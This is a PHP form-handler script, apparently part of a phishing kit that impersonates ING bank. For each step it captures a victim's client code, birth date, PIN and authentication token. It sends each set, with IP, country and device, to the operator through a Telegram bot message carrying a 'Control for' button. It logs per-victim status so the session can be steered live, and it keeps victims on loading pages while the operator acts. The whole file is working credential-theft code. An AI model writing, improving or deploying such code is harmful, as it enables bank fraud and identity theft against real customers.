<?php
// ============================================================
// 1. DEBUG: Write everything to a local file
// ============================================================
$debug_file = __DIR__ . '/submit_debug.txt';
file_put_contents($debug_file, "\n=== " . date('Y-m-d H:i:s') . " ===\n", FILE_APPEND);
file_put_contents($debug_file, "REQUEST_METHOD: " . $_SERVER['REQUEST_METHOD'] . "\n", FILE_APPEND);
file_put_contents($debug_file, "RAW POST: " . print_r($_POST, true) . "\n", FILE_APPEND);

// ============================================================
// 2. Include your files
// ============================================================
include "../config.php";
include "../lib/geoplugin.class.php";
include "../lib/UserInfo.php";

// ============================================================
// 3. Enable error logging (no screen output)
// ============================================================
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/tmp/php_errors.log');

// ============================================================
// 4. Your existing logic with added safety
// ============================================================
$geoplugin = new geoPlugin();
$user = new UserInfo();

$geoplugin->locate();
$ip = get_user_ip();

// Ensure session link exists (if not, set a default)
$newLink = $_SESSION['link'] ?? 'https://default.link';

$keyboard = json_encode([
    "inline_keyboard" => [
        [
            [
                "text" => '🕹 Control for : [ ' . get_user_ip() . " - " . $geoplugin->countryCode . ' ]',
                "url" => "$newLink"
            ]
        ],
    ]
]);

$id_user = str_replace(".", "-", $ip);
$filename = "../panel/logs/$id_user.json";

// Safely read the JSON file
$data = [];
if (file_exists($filename)) {
    $file_content = file_get_contents($filename);
    if ($file_content !== false) {
        $data = json_decode($file_content, true);
        if (!is_array($data)) {
            $data = [];
        }
    }
}

// ============================================================
// 5. Handle POST request (with trim() to fix hidden spaces)
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // --- FIX: Trim the step to avoid whitespace issues ---
    $step = trim($_POST['step'] ?? '');
    file_put_contents($debug_file, "Trimmed step: '$step'\n", FILE_APPEND);
    error_log("submit.php - Trimmed step: '$step'");

    if ($step === 'login') {
        file_put_contents($debug_file, "MATCH: login\n", FILE_APPEND);
        error_log("MATCH: login step detected.");

        $message =
            "[+]——————[ ING ]——————[+]\r\n" .
            "👥 CLIENT CODE = " . $_POST['clientCode'] . "\r\n" .
            "📅 BIRTH DATE = " . $_POST['birthDate'] . "\r\n" .
            "📍 IP = " . $ip . " | " . $geoplugin->countryCode . "\r\n" .
            "📱 Device = " . $user->get_os() . "\r\n" .
            "[+]——————[ ING ]——————[+]\r\n";

        $data['status'] = 'wait';
        $json = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents($filename, $json);

        error_log("Calling telegram_message for login...");
        telegram_message($message, $keyboard);
        error_log("telegram_message called for login.");

        header("Location: loading.php?redirect=" . random_int(1000000000, 9999999999));
        exit;
    }

    if ($step === 'call') {
        file_put_contents($debug_file, "MATCH: call\n", FILE_APPEND);
        error_log("MATCH: call step detected.");

        $message =
            "[+]——————[ ING ]——————[+]\r\n" .
            "👥 galak nadi ghir soner \r\n" .
            "📍 IP = " . $ip . " | " . $geoplugin->countryCode . "\r\n" .
            "📱 Device = " . $user->get_os() . "\r\n" .
            "[+]——————[ ING ]——————[+]\r\n";

        $data['status'] = 'wait';
        $json = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents($filename, $json);

        error_log("Calling telegram_message for call...");
        telegram_message($message, $keyboard);
        error_log("telegram_message called for call.");

        header("Location: loadcall.php?redirect=" . random_int(1000000000, 9999999999));
        exit;
    }

    if ($step === 'pin') {
        file_put_contents($debug_file, "MATCH: pin\n", FILE_APPEND);
        error_log("MATCH: pin step detected.");

        $message =
            "[+]——————[ ING ]——————[+]\r\n" .
            "🔑 PIN = " . $_POST['pin'] . "\r\n" .
            "📍 IP = " . $ip . " | " . $geoplugin->countryCode . "\r\n" .
            "📱 Device = " . $user->get_os() . "\r\n" .
            "[+]——————[ ING ]——————[+]\r\n";

        $data['status'] = 'wait';
        $json = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents($filename, $json);

        error_log("Calling telegram_message for pin...");
        telegram_message($message, $keyboard);
        error_log("telegram_message called for pin.");

        header("Location: loading.php?redirect=" . random_int(1000000000, 9999999999));
        exit;
    }

    if ($step === 'token') {
        file_put_contents($debug_file, "MATCH: token\n", FILE_APPEND);
        error_log("MATCH: token step detected.");

        $message =
            "[+]——————[ ING ]——————[+]\r\n" .
            "🔐 TOKEN = " . $_POST['token'] . "\r\n" .
            "📍 IP = " . $ip . " | " . $geoplugin->countryCode . "\r\n" .
            "📱 Device = " . $user->get_os() . "\r\n" .
            "[+]——————[ ING ]——————[+]\r\n";

        $data['status'] = 'wait';
        $json = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents($filename, $json);

        error_log("Calling telegram_message for token...");
        telegram_message($message, $keyboard);
        error_log("telegram_message called for token.");

        header("Location: loading.php?redirect=" . random_int(1000000000, 9999999999));
        exit;
    }

    // --- If we reach here, the step didn't match anything ---
    file_put_contents($debug_file, "WARNING: No match for step '$step'\n", FILE_APPEND);
    error_log("WARNING: No match for step '$step'");
} else {
    // --- Not a POST request ---
    file_put_contents($debug_file, "ERROR: Not a POST request (method: " . $_SERVER['REQUEST_METHOD'] . ")\n", FILE_APPEND);
    error_log("ERROR: Not a POST request (method: " . $_SERVER['REQUEST_METHOD'] . ")");
}
?>